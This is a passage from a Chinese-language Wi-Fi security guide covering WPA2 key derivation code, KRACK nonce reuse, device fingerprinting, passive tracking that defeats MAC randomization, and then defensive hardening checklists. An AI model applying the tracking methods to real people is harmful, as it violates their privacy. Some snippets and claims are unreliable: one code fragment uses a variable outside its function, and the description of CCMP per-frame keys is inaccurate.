对于WPA2-PSK：
- PRF = HMAC-SHA1
- c = 4096次迭代
- Salt = SSID
- dklen = 256位（32字节）
- hlen = 160位（20字节）

**为什么PBKDF2让破解变慢**：
- 每次密码猜测都需要执行4096次HMAC-SHA1
- 相比直接哈希，破解速度慢4096倍
- 但GPU仍然可以每秒处理数十万次

**Python实现示例**：

```python
import hashlib
import hmac

def pbkdf2(password, salt, iterations, dklen):
    dk = b''
    block_index = 1
    while len(dk) < dklen:
        u = hmac.new(password.encode(), salt.encode() + block_index.to_bytes(4, 'big'), hashlib.sha1).digest()
        result = u
        for _ in range(iterations - 1):
            u = hmac.new(password.encode(), u, hashlib.sha1).digest()
            result = bytes(a ^ b for a, b in zip(result, u))
        dk += result
        block_index += 1
    return dk[:dklen]

pmk = pbkdf2("password123", "MyWiFi", 4096, 32)
print(f"PMK: {pmk.hex()}")
```

#### 7.2.2 PTK计算深入

**PRF函数实现**：

WPA2使用自定义的PRF函数（称为PRF-512、PRF-384等，取决于输出长度）：

```python
def prf(key, label, data, length):
    result = b''
    i = 0
    while len(result) < length:
        msg = bytes([i]) + label.encode() + data
        h = hmac.new(key, msg, hashlib.sha1).digest()
        result += h
        i += 1
    return result[:length]
```

**完整PTK计算示例**：

```python
def compute_ptk(pmk, aa, spa, anonce, snonce):
    if aa < spa:
        mac_min, mac_max = aa, spa
    else:
        mac_min, mac_max = spa, aa
    
    if anonce < snonce:
        nonce_min, nonce_max = anonce, snonce
    else:
        nonce_min, nonce_max = snonce, anonce
    
    data = mac_min + mac_max + nonce_min + nonce_max
    ptk = prf(pmk, "Pairwise key expansion", data, 48)
    return ptk

kck = ptk[0:16]
kek = ptk[16:32]
tk = ptk[32:48]
```

#### 7.2.3 TK（Temporal Key）与数据加密

TK是实际用于加密数据帧的密钥，但并不是直接用来加密。每个数据帧还会派生一个新的密钥：

**CCMP模式下的密钥派生**：
```
Temporal Key (TK) = 128位

对于每个数据帧：
    PN (Packet Number) = 48位序列号
    Nonce = Priority || MAC_SA || PN
    CCMP uses AES-CTR with Nonce and TK
    MIC Key: 使用同样的TK和AES-CMAC计算
```

#### 7.2.4 GTK计算与分发

**GTK生成**：

```python
def compute_gtk(gmk, aa, gnonce):
    data = aa + gnonce
    gtk = prf(gmk, "Group key expansion", data, 32)
    return gtk
```

**GTK分发**：
- GTK由AP生成
- 在四次握手的M3消息中发送给客户端
- 使用KEK加密保护
- 使用KCK计算MIC验证完整性

**GTK更新**：
- 客户端离开网络时，AP应更新GTK
- 定期更新GTK可提升安全性
- 更新通过Group Key Handshake完成

---

### 7.3 消息完整性校验（MIC）原理

#### 7.3.1 MIC的作用

MIC（Message Integrity Check）用于验证消息的完整性和真实性：
- 防止数据被篡改
- 防止数据被伪造
- 防止重放攻击（配合序列号）

#### 7.3.2 EAPOL消息的MIC

四次握手中的EAPOL消息使用MIC来验证完整性：

**MIC计算**：
```
MIC = HMAC-MD5(KCK, EAPOL消息体)
或
MIC = HMAC-SHA1(KCK, EAPOL消息体)
或
MIC = AES-CMAC-128(KCK, EAPOL消息体)  # WPA2/AES
```

**MIC位置**：
- EAPOL-Key帧的Key Information字段指明是否有MIC
- MIC位于Key Data字段之前
- 计算MIC时，MIC字段本身先填充为0

#### 7.3.3 数据帧的MIC

**CCMP的MIC**：
- CCMP使用CBC-MAC模式计算MIC
- MIC长度为64位（8字节）
- 同时保护帧头（部分字段）和数据载荷
- 加密和MIC使用同一个TK，但不同的处理模式

**CCMP封装过程**：
1. 构造CCM Nonce（PN + MAC + Priority）
2. 使用AES-CBC计算MIC（覆盖帧头和数据）
3. 使用AES-CTR加密数据和MIC
4. 结果：加密的数据 + 加密的MIC

**验证过程**：
1. 解密数据和MIC
2. 重新计算MIC
3. 比较计算的MIC和接收到的MIC
4. 不一致则丢弃帧

#### 7.3.4 Michael MIC（TKIP）

TKIP使用Michael算法计算MIC：
- Michael是一个64位的MIC算法
- 比CRC32强，但不如CCMP的CMAC
- 设计上有已知弱点
- TKIP已被弃用，仅作历史了解

---

### 7.4 CCMP与GCMP加密模式对比

#### 7.4.1 CCMP（Counter Mode with CBC-MAC Protocol）

CCMP是WPA2的默认加密协议，基于AES算法：

**组成部分**：
- **CTR模式**：用于加密数据（提供机密性）
- **CBC-MAC**：用于完整性校验（提供认证）
- 两者结合称为CCM模式

**CCMP数据封装**：
```
802.11头部 | CCMP头部 | 加密数据 | MIC | FCS
                |
                +-- PN (48位包序号)
                +-- KeyID
                +-- ExtIV
```

**安全特性**：
- 每个帧使用唯一的PN（Packet Number）
- PN递增，防止重放攻击
- PN + MAC地址构成CTR模式的nonce
- MIC保护帧头和数据的完整性

**CCMP的安全性**：
- 基于AES，安全性高
- 只要nonce不重复，就是安全的
- KRACK攻击利用了密钥重装导致nonce重复的问题

#### 7.4.2 GCMP（Galois/Counter Mode Protocol）

GCMP是WPA3支持的加密协议，基于GCM模式：

**组成部分**：
- **CTR模式**：加密数据
- **GMAC（Galois MAC）**：完整性校验
- 两者结合称为GCM模式

**与CCMP的区别**：
- 使用GCM而非CCM
- 计算效率更高（可并行计算）
- 适用于高速无线网络（802.11ac/ax）

#### 7.4.3 CCMP vs GCMP详细对比

| 特性 | CCMP | GCMP |
|------|------|------|
| 基础算法 | AES | AES |
| 模式 | CCM (CTR + CBC-MAC) | GCM (CTR + GMAC) |
| MIC长度 | 64位 (8字节) | 128位 (16字节) |
| 密钥长度 | 128位 | 128位 / 256位 |
| 计算效率 | 中等（串行） | 高（可并行） |
| 引入标准 | 802.11i (WPA2) | 802.11ac/ad (WPA3支持) |
| nonce重用后果 | 可解密明文 | 可解密明文 + 伪造认证 |
| KRACK影响 | 中等 | 严重 |

#### 7.4.4 为什么GCMP在KRACK下更危险

GCM模式的特点：
- 是一种流密码模式（CTR）
- 相同key+nonce会产生相同的密钥流
- 密钥流泄露可导致明文泄露
- 更严重的是，GMAC的认证密钥也会泄露

**GCMP下的KRACK利用**：
1. 密钥重装导致nonce重置
2. 相同key+nonce加密两个不同的明文P1和P2
3. 得到C1 = P1 XOR Keystream，C2 = P2 XOR Keystream
4. C1 XOR C2 = P1 XOR P2
5. 如果知道其中一个明文，可求出另一个
6. 更严重的是，可以恢复出GHASH密钥，从而伪造任意数据包

---

### 7.5 密钥重装与重放攻击

#### 7.5.1 重放攻击基础

**什么是重放攻击**：
- 攻击者捕获合法的加密数据包
- 在稍后的时间重新发送这个数据包
- 接收方无法区分是原始包还是重放包

**防御重放攻击的机制**：
- **序列号**：每个帧有递增的序列号
- **重放计数器**：接收方记录期望的下一个序列号
- **丢弃旧帧**：序列号小于当前值的帧被丢弃

#### 7.5.2 密钥重装如何导致重放攻击

**正常情况**：
- 密钥安装时，重放计数器初始化为0
- 每发送/接收一个帧，计数器递增
- 旧的帧因为序列号低而被丢弃

**密钥重装后**：
- 计数器被重置为初始值
- 之前的旧帧的序列号又"有效"了
- 攻击者可以重放之前捕获的帧
- 接收方会接受这些重放的帧

#### 7.5.3 重放攻击的危害

**组播重放**：
- 重装GTK后可以重放组播/广播帧
- 例如重放ARP请求、DHCP消息等
- 可能导致网络混乱或信息泄露

**单播重放**：
- 重装PTK后可以重放单播帧
- 重放TCP数据包可能干扰连接
- 重放应用层数据可能导致业务逻辑问题

#### 7.5.4 nonce重用与明文恢复

在CTR模式下，nonce重用是致命的：

```
C1 = P1 XOR Keystream(key, nonce)
C2 = P2 XOR Keystream(key, nonce)

C1 XOR C2 = P1 XOR P2
```

如果攻击者知道P1（例如一个HTTP请求，结构已知），就可以推导出P2。

**实际利用场景**：
1. 捕获正常通信中的加密数据包
2. 触发密钥重装（KRACK）
3. 诱导客户端发送新的数据
4. 新数据用相同的key+nonce加密
5. 通过XOR操作恢复明文


## 8. 高级无线侦察与指纹识别

### 8.1 802.11指纹识别技术概述

#### 8.1.1 什么是无线指纹识别

无线指纹识别是指通过分析无线信号和帧的特征，来识别设备类型、厂商、型号甚至具体设备的技术。

**指纹识别的分类**：
- **主动指纹识别**：发送探测帧，分析响应特征
- **被动指纹识别**：仅监听，不发送任何帧
- **信号层指纹**：基于物理层信号特征
- **协议层指纹**：基于802.11协议实现特征

#### 8.1.2 指纹识别的应用场景

**安全领域**：
- 检测恶意设备（未授权AP、隐藏设备）
- 设备资产盘点
- 入侵检测（识别已知攻击工具的指纹）
- 网络边界监控

**商业领域**：
- 客流统计
- 用户行为分析
- 精准营销
- 位置服务

**研究领域**：
- 设备行为分析
- 网络测绘
- 漏洞研究

---

### 8.2 设备指纹与驱动指纹

#### 8.2.1 信息元素（IE）指纹

每个AP和客户端发送的802.11管理帧中包含各种信息元素（Information Element）。这些元素的顺序、内容和组合方式构成了独特的指纹。

**AP端指纹特征**：
- 支持的速率集（Supported Rates IE）
- RSN IE的具体内容（加密套件、AKM套件顺序）
- 供应商特定IE（Vendor Specific IE）
- HT能力IE（802.11n）
- VHT能力IE（802.11ac）
- HE能力IE（802.11ax）
- Beacon间隔的精确度
- DTIM周期

**客户端指纹特征**：
- Probe Request中的SSID列表
- 支持的速率集
- 支持的信道列表
- HT/VHT/HE能力
- 厂商特定IE（如WPS、Apple特定IE）
- Probe Request的时间间隔模式

#### 8.2.2 常见设备指纹库

**Wireshark的设备指纹**：
- Wireshark内置了一些厂商识别
- 基于OUI（MAC地址前24位）

**aircrack-ng的airodump-ng**：
- 显示AP的加密方式和厂商
- 基于OUI和能力信息

**Kismet**：
- 更详细的设备指纹
- 客户端行为分析
- 设备类型推断

**专业工具**：
- WiGLE：全球WiFi数据库
- Ekahau Site Survey：企业级无线勘测
- AirMagnet：企业级无线安全

#### 8.2.3 驱动指纹识别

不同的WiFi驱动程序有不同的实现细节，这些差异可以用来识别驱动甚至操作系统：

**驱动指纹特征**：
- 关联请求中的信息元素顺序
- 重试策略（重试次数、重试间隔）
- 信道扫描模式（扫描顺序、每个信道停留时间）
- 功率控制行为
- 漫游触发条件和行为

**操作系统级别的指纹**：

| 操作系统 | 典型特征 |
|---------|---------|
| Windows | 特定的IE顺序，NDIS驱动特征 |
| macOS/iOS | Apple特定的Vendor IE，AWDL（Apple Wireless Direct Link） |
| Android | 各种厂商定制，多样性高 |
| Linux | 通常基于mac80211，特征相对统一 |

#### 8.2.4 实战：使用scapy进行指纹分析

```python
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt

def analyze_ap_fingerprint(packet):
    if packet.haslayer(Dot11Beacon):
        beacon = packet[Dot11Beacon]
        bssid = packet[Dot11].addr2
        
        ie_order = []
        layer = packet.getlayer(Dot11Elt)
        while layer:
            if hasattr(layer, 'ID'):
                ie_order.append(layer.ID)
            layer = layer.payload if hasattr(layer, 'payload') else None
            if layer and not isinstance(layer, Dot11Elt):
                break
        
        print(f"BSSID: {bssid}")
        print(f"IE顺序: {ie_order}")

sniff(iface="wlan0mon", prn=analyze_ap_fingerprint, count=100)
```

---

### 8.3 客户端设备被动识别

#### 8.3.1 被动识别的优势

- **完全静默**：不发送任何帧，不会被检测
- **可远程进行**：只要在信号范围内
- **不影响网络**：不会对网络造成任何干扰
- **可长期监控**：持续收集设备信息

#### 8.3.2 Probe Request分析

Probe Request是客户端指纹识别的主要信息来源：

**信息内容**：
- 客户端MAC地址（可能被随机化）
- 请求的SSID（已知网络列表）
- 支持的速率
- 支持的信道
- HT/VHT能力
- 厂商特定信息

**行为模式**：
- 发送间隔
- 信道扫描模式
- 发送功率
- 重传行为

#### 8.3.3 MAC地址随机化应对

现代操作系统普遍使用MAC地址随机化来保护隐私：
- iOS 8+：默认启用随机MAC
- Android 6.0+：支持随机MAC
- Windows 10+：支持随机硬件地址

**应对随机化的方法**：

1. **行为指纹**：
   - 扫描模式（信道顺序、停留时间）
   - Probe Request的内容和结构
   - 发送间隔模式

2. **关联后识别**：
   - 客户端关联后使用真实MAC
   - 通过数据帧中的特征识别

3. **信号特征**：
   - 信号强度模式
   - 定时特征（时钟偏移）

4. **设备关联分析**：
   - 同一设备的不同接口（WiFi+蓝牙）
   - 时间和空间关联

#### 8.3.4 客户端行为画像

通过长期监控，可以建立客户端的行为画像：

- **出现时间规律**：工作日/周末、早晚高峰
- **位置移动规律**：在不同AP之间的漫游
- **连接偏好**：常连接的网络类型
- **数据使用模式**：流量大小、协议分布
- **设备活跃度**：发送/接收数据的频率

---

### 8.4 接入点型号与固件版本识别

#### 8.4.1 AP指纹识别方法

**基于信息元素的识别**：
- 不同厂商的AP发送的Beacon帧有不同的IE组合
- 同一厂商不同型号的AP也有差异
- 固件版本也会影响IE内容

**基于响应时间的识别**：
- 不同AP对Probe Request的响应延迟不同
- 处理能力不同导致响应时间差异

**基于错误响应的识别**：
- 发送异常构造的帧
- 不同实现的错误响应不同
- 类似TCP/IP协议栈指纹识别

#### 8.4.2 常见厂商AP特征

**Cisco**：
- 特定的Cisco Vendor IE
- CCX支持信息
- 通常有较高的Beacon间隔稳定性

**Ubiquiti (UniFi)**：
- Ubiquiti特定的Vendor IE
- 支持的功能集特征

**TP-Link**：
- 常见的配置模式
- 特定的默认SSID模式

**MikroTik**：
- RouterOS特定的信息元素
- 独特的功能声明

#### 8.4.3 实战：AP指纹数据库

构建AP指纹数据库的步骤：

1. **数据收集**：
   - 在已知AP环境下收集Beacon帧
   - 记录AP型号、固件版本
   - 提取所有IE信息

2. **特征提取**：
   - IE的ID顺序
   - 每个IE的长度
   - IE内容的关键字节
   - Beacon间隔精度

3. **分类模型**：
   - 使用机器学习模型进行分类
   - 决策树、随机森林等
   - 根据特征识别型号和固件

---

### 8.5 无线流量分析与设备行为画像

#### 8.5.1 流量分析可以获取的信息

即使流量被加密，通过流量分析仍可获取大量信息：

**设备类型推断**：
- 流量模式（突发流量 vs 持续流量）
- 端口使用情况
- 协议分布
- DNS查询模式

**用户行为分析**：
- 上网时间规律
- 流量大小变化
- 漫游模式
- 连接的AP和时间

**应用识别**：
- 通过包大小和时间模式识别应用
- 例如：视频流（大包、持续）、VoIP（小包、固定间隔）
- TLS SNI（服务器名称指示）可暴露访问的网站

#### 8.5.2 加密流量分析技术

**流量特征提取**：
- 包大小分布
- 包间隔时间
- 流量突发模式
- 上行/下行流量比例

**网站指纹识别**：
- 即使使用HTTPS，通过包大小和顺序仍可识别访问的网页
- 每个网页有独特的资源加载模式
- 防御：流量填充、Tor等

**设备活动识别**：
- 视频观看：下行大包持续流量
- 语音通话：小包双向对称
- 文件下载：下行大流量
- 浏览网页：突发流量

#### 8.5.3 元数据泄露

**802.11帧头信息**：
- MAC地址（设备身份）
- BSSID（所属网络）
- 帧类型/子类型
- 序列号（行为模式）
- 持续时间（流量估算）

**数据量估算**：
- 通过帧的数量和大小估算总流量
- 即使无法解密内容，也能知道通信量
- 可推断用户活动

---

### 8.6 基于信号特征的定位与追踪

#### 8.6.1 RSSI定位原理

RSSI（Received Signal Strength Indicator）是最常用的定位依据：

**三角定位法**：
- 至少三个已知位置的接收器
- 测量目标设备的信号强度
- 根据信号衰减模型估算距离
- 用三角测量计算位置

**指纹定位法**：
- 预先建立信号指纹地图（每个位置的RSSI特征）
- 实时测量RSSI并与指纹库匹配
- 精度更高，但需要预先勘测

#### 8.6.2 定位精度与限制

**影响精度的因素**：
- 多径效应（信号反射）
- 障碍物（墙壁、人体）
- 环境变化（家具移动、人员走动）
- 天线方向和增益
- 发送功率变化

**典型精度**：
- 室外开阔地：5-20米
- 室内多房间：3-10米
- 高精度系统：1-3米

#### 8.6.3 设备追踪

**人员追踪**：
- 通过WiFi信号追踪人员位置
- 商场客流分析
- 人员路径追踪
- 即使不连接AP，只要WiFi开启就可被追踪

**防御追踪的方法**：
- 关闭WiFi（不使用时）
- 使用MAC地址随机化
- 信号混淆技术
- 法律和监管限制

#### 8.6.4 时钟偏移指纹

每个设备的时钟都有微小的偏移（Clock Skew），这种偏移是独特的，可以用来识别设备：

**原理**：
- 每个设备的晶振频率略有不同
- 导致时间戳有独特的漂移模式
- 这种漂移模式是设备的物理指纹
- 无法通过软件修改

**应用**：
- 绕过MAC地址随机化
- 识别特定设备
- 跨网络追踪设备


## 9. 防御与加固

### 9.1 针对各类攻击的防御措施

#### 9.1.1 WPA3攻击防御

| 攻击类型 | 防御措施 |
|---------|---------|
| Dragonblood侧信道攻击 | 更新固件（hostapd/wpa_supplicant已修复） |
| 降级攻击 | 禁用WPA2过渡模式，纯WPA3环境 |
| SAE在线猜测 | 启用速率限制，限制认证尝试次数 |
| 密码暴力破解 | 使用强密码（至少12位，混合字符） |

**详细措施**：

1. **纯WPA3部署**：
   - 如果所有设备都支持WPA3，禁用WPA2
   - 消除降级攻击的可能性

2. **固件更新**：
   - 确保AP和客户端都安装了Dragonblood补丁
   - 定期检查并更新固件

3. **强密码策略**：
   - 即使SAE抗离线攻击，强密码仍能防御在线猜测
   - 建议12位以上，包含大小写、数字、符号

4. **速率限制**：
   - 配置AP限制同一客户端的认证尝试频率
   - 防止在线暴力破解

#### 9.1.2 Enterprise WiFi攻击防御

| 攻击类型 | 防御措施 |
|---------|---------|
| Evil Twin | 启用服务器证书验证，配置正确的CA |
| GTC降级 | 客户端仅允许指定EAP方法 |
| EAP中继 | 部署WIPS，启用通道绑定 |
| RADIUS攻击 | 使用强共享密钥，限制RADIUS访问 |

**详细措施**：

1. **证书验证强制化**：
   - 客户端必须验证服务器证书
   - 配置受信任的根CA
   - 验证证书域名/主题

2. **EAP方法限制**：
   - 仅启用需要的EAP方法
   - 禁用不安全的方法（如EAP-MD5、LEAP）
   - 优先使用EAP-TLS

3. **RADIUS安全加固**：
   - 使用强共享密钥（至少16位随机字符）
   - 限制RADIUS服务器的访问源IP
   - 启用RADIUS/TLS（RadSec）

4. **账号安全**：
   - 使用强密码策略
   - 启用账号锁定（多次失败后锁定）
   - 定期审计账号使用情况

#### 9.1.3 管理帧攻击防御

| 攻击类型 | 防御措施 |
|---------|---------|
| 取消认证攻击 | 启用MFP（802.11w）必需模式 |
| Beacon洪泛 | 部署WIPS，检测异常Beacon |
| Evil Twin | WIPS检测和定位，员工培训 |
| 半关联攻击 | 监控异常关联模式 |

**详细措施**：

1. **启用MFP**：
   - 配置为"Required"模式
   - 确保所有客户端支持MFP
   - 不支持MFP的设备应升级或隔离

2. **无线入侵检测**：
   - 部署WIDS/WIPS系统
   - 监控未授权AP
   - 检测异常管理帧流量

3. **物理安全**：
   - 限制物理接入范围
   - 定期进行无线场地勘测
   - 检测和定位未授权设备

#### 9.1.4 KRACK攻击防御

| 攻击类型 | 防御措施 |
|---------|---------|
| KRACK密钥重装 | 安装所有设备的安全补丁 |
| 流量解密 | 使用端到端加密（VPN、HTTPS） |
| 重放攻击 | 补丁修复 + 应用层防护 |

**详细措施**：

1. **补丁管理**：
   - 确保所有客户端安装KRACK补丁
   - 确保所有AP/控制器安装补丁
   - 建立固件更新机制

2. **端到端加密**：
   - 即使WiFi加密被破解，数据仍受保护
   - 强制使用HTTPS（HSTS）
   - 企业网络使用VPN

3. **网络分段**：
   - 无线网络与内部网络隔离
   - 通过防火墙控制访问
   - 限制无线用户的访问权限

#### 9.1.5 Captive Portal攻击防御

| 攻击类型 | 防御措施 |
|---------|---------|
| 虚假Portal | 验证Portal证书，使用官方APP认证 |
| 自动连接漏洞 | 禁用开放网络自动连接 |
| DNS劫持 | 使用加密DNS（DoH/DoT） |
| 流量劫持 | 使用VPN，验证HTTPS证书 |

**详细措施**：

1. **用户教育**：
   - 不随意连接公共WiFi
   - 不轻易信任Captive Portal
   - 公共WiFi下不进行敏感操作

2. **设备配置**：
   - 关闭自动连接开放网络
   - 定期清理已知网络列表
   - 启用VPN自动连接公共网络

3. **技术防护**：
   - 使用HTTPS Everywhere
   - 启用DNS over HTTPS/TLS
   - 使用VPN保护所有流量

---

### 9.2 企业无线安全最佳实践

#### 9.2.1 网络架构设计

**分层架构**：

```
互联网
   |
[防火墙]
   |
[核心交换机]
   |
   +-- [无线控制器] -- [AP] -- 无线网络
   |
   +-- 内部有线网络
   |
   +-- [DMZ区]
```

**网络分段原则**：
- 访客网络与内部网络完全隔离
- 不同部门使用不同SSID和VLAN
- IoT设备单独划分网络
- 无线访问受防火墙控制

**SSID规划**：
- 企业员工网络：WPA3-Enterprise，EAP-TLS
- 访客网络：Captive Portal，隔离VLAN
- IoT网络：WPA3-Personal，MAC白名单，网络隔离
- 不使用隐藏SSID（安全性提升有限，使用不便）

#### 9.2.2 认证与加密

**推荐认证方式**（按安全性排序）：

1. **WPA3-Enterprise + EAP-TLS**：最高安全性
   - 双向证书认证
   - 无密码泄露风险
   - 适合高安全要求环境

2. **WPA3-Enterprise + PEAP/EAP-TTLS**：
   - 服务器端证书认证
   - 内层密码认证
   - 部署成本较低

3. **WPA3-Personal (SAE)**：
   - 适用于小型办公室
   - 使用强密码
   - 比WPA2-PSK安全

**禁用的认证方式**：
- WEP（完全不安全）
- WPA（已过时）
- WPA2-TKIP（TKIP已被破解）
- LEAP（思科专有，已不安全）
- EAP-MD5（单向认证，易被破解）

#### 9.2.3 AP安全配置基线

**加密配置**：
- 加密协议：WPA3-Enterprise（首选），WPA2-Enterprise（过渡）
- 加密算法：AES-CCMP（必需），GCMP（可选）
- 禁用TKIP、WEP

**管理帧保护**：
- MFP模式：Required（如所有客户端支持）
- 不支持MFP的客户端应升级

**WPS配置**：
- 禁用WPS-PIN模式（易受暴力破解）
- 如需WPS，仅使用WPS-PBC（按钮配置）

**广播配置**：
- 禁用默认SSID（如"linksys"、"default"）
- SSID不包含公司敏感信息
- 禁用旧的802.11b速率（如1/2 Mbps）

**管理接口安全**：
- 禁用HTTP管理，仅用HTTPS/SSH
- 更改默认管理员密码
- 使用强密码或密钥认证
- 限制管理接口的访问源
- 启用审计日志

#### 9.2.4 客户端安全配置

**策略**：
- 统一部署无线配置（通过GPO、MDM等）
- 强制证书验证
- 禁止用户随意添加无线网络
- 禁用ad-hoc模式

**设备管理**：
- 仅允许受管设备连接企业网络
- NAC（网络访问控制）检查设备健康状态
- 设备注册和白名单机制
- 离职员工及时撤销访问权限

---

### 9.3 无线入侵检测与防御（WIDS/WIPS）

#### 9.3.1 WIDS与WIPS概述

**WIDS（Wireless Intrusion Detection System）**：
- 检测无线攻击和未授权设备
- 监控无线频谱和流量
- 产生告警和日志

**WIPS（Wireless Intrusion Prevention System）**：
- 在WIDS基础上增加防御功能
- 主动阻断攻击
- 压制未授权设备

#### 9.3.2 WIDS/WIPS的主要功能

**检测功能**：
- Rogue AP检测（未授权接入点）
- Evil Twin检测
- 取消认证/解除关联攻击检测
- KRACK攻击检测
- Beacon洪泛检测
- 异常流量检测
- 无线渗透测试工具检测

**防御功能**：
- 自动阻断未授权AP
- 取消认证攻击防御
- 干扰恶意AP信号
- 自动关闭受影响端口

**定位功能**：
- 定位未授权设备位置
- 追踪移动设备
- 可视化热点图

#### 9.3.3 部署架构

**分布式部署**：
- 专用传感器部署在各个区域
- 集中管理和分析
- 覆盖范围广，成本高

**集成式部署**：
- 利用现有AP兼任传感器
- 成本低，性能可能受影响
- 适合中小企业

**混合部署**：
- 关键区域专用传感器
- 其他区域使用AP兼任
- 平衡成本和性能

#### 9.3.4 常见WIDS/WIPS产品

**企业级**：
- Cisco DNA Center / Cisco Prime Infrastructure
- Aruba Central / AirWave
- Fortinet FortiWIPS
- Extreme Management Center

**开源/低成本**：
- Kismet（检测为主）
- 基于Python的定制方案

---

### 9.4 安全配置基线

#### 9.4.1 WLAN控制器安全基线

**管理安全**：
- [ ] 更改默认管理员密码
- [ ] 启用强密码策略
- [ ] 配置多因素认证（如支持）
- [ ] 禁用未使用的管理接口
- [ ] 启用HTTPS/SSH，禁用Telnet/HTTP
- [ ] 限制管理访问源IP
- [ ] 启用审计日志
- [ ] 配置日志服务器

**无线安全**：
- [ ] 禁用WEP和WPA
- [ ] 禁用TKIP加密
- [ ] 启用WPA3（如设备支持）
- [ ] 启用MFP（802.11w）
- [ ] 禁用WPS-PIN
- [ ] 配置RADIUS强共享密钥
- [ ] 启用RADIUS记账
- [ ] 配置客户端空闲超时
- [ ] 配置每个AP的最大客户端数

**网络安全**：
- [ ] 启用控制平面安全
- [ ] 配置CAPWAP DTLS加密
- [ ] 禁用未使用的VLAN
- [ ] 启用DHCP Snooping
- [ ] 启用动态ARP检测

#### 9.4.2 AP安全基线

**通用配置**：
- [ ] 更改默认凭证
- [ ] 更新最新固件
- [ ] 禁用未使用的服务
- [ ] 启用NTP时间同步
- [ ] 配置SNMPv3（如需要）
- [ ] 禁用SNMPv1/v2c

**无线射频配置**：
- [ ] 禁用低速率（1/2 Mbps）
- [ ] 合理设置发射功率
- [ ] 信道规划（避免干扰）
- [ ] 启用DFS（雷达检测，5GHz）
- [ ] 禁用40MHz信道宽度（2.4GHz，避免干扰）

#### 9.4.3 RADIUS服务器安全基线

**系统安全**：
- [ ] 操作系统加固
- [ ] 最小化安装
- [ ] 启用防火墙
- [ ] 定期更新补丁
- [ ] 启用审计日志

**RADIUS配置**：
- [ ] 使用强共享密钥（至少16位随机）
- [ ] 限制客户端IP白名单
- [ ] 禁用未使用的EAP方法
- [ ] 启用账户锁定策略
- [ ] 配置认证失败告警
- [ ] 使用证书验证（EAP-TLS）
- [ ] 定期轮换证书和密钥

#### 9.4.4 客户端安全基线

**Windows客户端**：
- [ ] 配置企业WiFi配置文件（通过GPO）
- [ ] 强制验证服务器证书
- [ ] 禁用自动连接开放网络
- [ ] 启用防火墙
- [ ] 保持系统更新
- [ ] 安装防病毒软件

**移动设备**：
- [ ] 通过MDM部署WiFi配置
- [ ] 禁用开放网络自动加入
- [ ] 启用随机MAC地址
- [ ] 强制设备加密
- [ ] 启用远程擦除功能
- [ ] 定期更新系统

#### 9.4.5 安全运维实践

**定期检查**：
- 每月：审查无线安全日志
- 每季度：无线场地勘测（检测未授权设备）
- 每半年：渗透测试
- 每年：全面安全审计

**应急响应**：
- 制定无线安全事件响应流程
- 定期演练应急响应
- 建立设备黑名单机制
- 准备应急工具包

**文档与培训**：
- 维护网络架构文档
- 记录所有无线设备清单
- 定期进行员工安全培训
- 更新安全策略和流程

---

## 参考文献

1. Vanhoef, M., & Ronen, E. (2019). Dragonblood: Analyzing the WPA3 Dragonfly Handshake.
2. Vanhoef, M., & Piessens, F. (2017). Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2.
3. IEEE Std 802.11w-2009: Protected Management Frames.
4. IEEE Std 802.11i-2004: Medium Access Control (MAC) Security Enhancements.
5. RFC 7664: Dragonfly Key Exchange.
6. RFC 8110: Opportunistic Wireless Encryption.
7. WiFi Alliance: WPA3 Security Specification.
8. Open Source: hostapd, wpa_supplicant, aircrack-ng, hcxtools.

---

> **声明**：本文档仅供学习和研究使用。未经授权的网络攻击是违法行为，请遵守相关法律法规。

